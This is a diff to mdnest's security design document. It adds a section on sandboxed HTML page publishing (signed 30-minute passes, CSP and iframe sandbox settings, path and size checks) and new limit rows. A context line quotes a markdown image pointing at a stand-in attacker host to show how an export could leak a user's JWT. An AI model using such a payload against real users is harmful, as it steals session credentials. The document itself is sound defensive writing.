@@ -499,6 +499,95 @@ This is a second layer, not the only one — mermaid also runs at its default `s
 
 The standalone Marp export inlines images as data URIs, fetching each with the user's session token so `/api/files/…` assets resolve. Deck content is user-authored and shared, so an image URL is attacker-controlled: a deck containing `![](https://evil.example/x.png)` would hand the mdnest JWT of whoever exported it to that host. The export therefore attaches `Authorization` **only** when the resolved URL is same-origin; cross-origin images are still fetched (so public assets inline and the deck stays self-contained) but never with credentials, and non-`http(s)` schemes are skipped. This was caught in review and never shipped in a release.
 
+### HTML pages
+
+`ENABLE_PAGES` (optional, off by default) lets people and agents publish
+HTML pages to a namespace. A page is someone else's HTML and script, shown in
+the viewer's browser, so the main risk is a page's script acting as the
+viewer: mdnest keeps the login token in `localStorage`, and a script on
+mdnest's own origin could read it and call the API as that person. The design
+keeps a page off mdnest's origin whenever its scripts run.
+
+**The server never runs a page.** It stores files and serves them. It does not
+render HTML, run a headless browser or take screenshots. The only parsing is
+one pass over `index.html` at publish time to pull out its title and visible
+text for search, and control characters are removed from both, so a title
+cannot carry terminal escape codes into `mdnest page list`.
+
+**Publishing.** Only someone with write access to the namespace root can
+publish or delete a page; read access on the root lets you list and view. A
+grant on a subfolder does not give access to pages. Every path in an uploaded
+folder goes through `SafeRelPath` and `SafePath`: `..`, absolute paths and
+`.git` are refused, and only plain files and folders are accepted (symlinks,
+hard links, devices and FIFOs are refused, and so is the same file twice).
+`PAGES_MAX_MB` and `PAGES_MAX_FILES` are counted on the unpacked bytes as they
+are written, so a small gzip that unpacks to gigabytes stops at the limit.
+Page names are 1 to 64 of `a-z`, `0-9` and `-`, so a name can never be a
+dotfile or a path.
+
+**Viewing goes through a pass.** Opening a page asks the API for a frame URL.
+The server checks read access, then signs a pass with the server's JWT secret
+that names one namespace, one page and the page's current version, and
+expires after 30 minutes. The pass sits in the URL path, so the page's own
+relative links carry it, and the page is served to whoever presents it, with
+no other login. Consequences:
+
+- A pass is never a login. It carries `purpose: page`, which the session
+  check refuses everywhere else, and a session token is refused as a pass.
+- A pass opens one page. The namespace and page come only from the pass, so
+  a page cannot name another page, and a pass made before the page was
+  republished, or deleted and recreated, is refused.
+- Anyone holding a frame URL can view that page until the pass expires,
+  including someone whose access was removed after it was made: a revoked
+  user can still open a page for up to 30 minutes. The pages address has no
+  session to check again on each file. Treat a frame URL like a short-lived
+  share link; it can show up in a proxy's access log.
+
+**Static mode (no `PAGES_ORIGIN`).** Page files are served from mdnest's own
+address under `/api/pages/view/`, with the same kind of script-less sandbox
+as other uploaded HTML: `Content-Security-Policy: default-src 'none'`, with
+images, styles and fonts allowed only from the page itself, and `sandbox`
+without `allow-scripts`. The frame in the app is also `sandbox=""`. Scripts do
+not run, and the page sits in a unique origin.
+
+**Script mode (`PAGES_ORIGIN` set).** Page files are served only from the
+second address, by a separate listener that serves page files and nothing
+else: no API route, no CORS, GET and HEAD only. mdnest's own address does not
+serve page files in this mode. Each response carries:
+
+- `Content-Security-Policy` with `sandbox allow-scripts` and never
+  `allow-same-origin`, so the page runs in an opaque origin even when opened
+  directly. With `PAGES_NETWORK=strict` it may load and fetch only from the
+  pages address; with `open`, also from any `https:` site. `object-src`,
+  `frame-src`, `base-uri` and `form-action` are `'none'`, and
+  `frame-ancestors` is `FRONTEND_ORIGIN`.
+- The frame in the app is `sandbox="allow-scripts"` and nothing else: no
+  `allow-same-origin`, `allow-top-navigation`, `allow-popups` or
+  `allow-forms`. The page cannot read mdnest's `localStorage`, cannot call the
+  API as the viewer (it has no token, and auth is a header, not a cookie),
+  and cannot navigate the window around it.
+
+The backend refuses a `PAGES_ORIGIN` with the same scheme, host and port as
+`FRONTEND_ORIGIN`: it logs an error and stays in static mode, and `setup.sh`
+and the Helm chart refuse it outright. Auth is not cookie-based, so a sibling
+subdomain or a second port is acceptable as the pages address: the only
+cookie mdnest sets is the SSO login's short-lived state cookie, which is
+host-only (no `Domain`) and `HttpOnly`, and is not a login.
+
+**Every page response, in both modes,** also carries
+`X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` (so a pass
+never leaks to an outside site in a `Referer`) and
+`Cache-Control: private, no-store` (so a shared browser or proxy never keeps a
+private page).
+
+With `PAGES_NETWORK=open`, a page's script can send what it shows to any
+outside site. That is the page author's choice, the same as publishing the
+data anywhere else, but it is why `strict` is the default.
+
+Tests: `backend/handlers/pages_test.go` and `backend/routes_pages_test.go`
+(headers, passes, permissions, limits, paths), and the browser specs listed in
+`docs/codemap.md`.
+
 ---
 
 ## Operational security
@@ -608,6 +697,8 @@ Both base images are pinned to moving tags (`golang:1.26-alpine`, `node:20-alpin
 | Folder download / transfer *(v4.7.0+)* | 500 files, 100 MB (`DOWNLOAD_MAX_FILES`, `DOWNLOAD_MAX_MB`) |
 | Concurrent zip downloads *(v4.7.0+)* | 1 per user, 2 server-wide (`DOWNLOAD_MAX_CONCURRENT`) |
 | Clipboard copy between servers *(v4.7.0+)* | 1 MB of UTF-8 |
+| HTML page (`ENABLE_PAGES`) | 20 MB unpacked, 500 files (`PAGES_MAX_MB`, `PAGES_MAX_FILES`) |
+| HTML page pass | 30 minutes, one page |
 | JWT expiry | 30 days |
 | Login rate limit | none (relies on network boundary) |
 | API token expiry | none (revoke manually) |
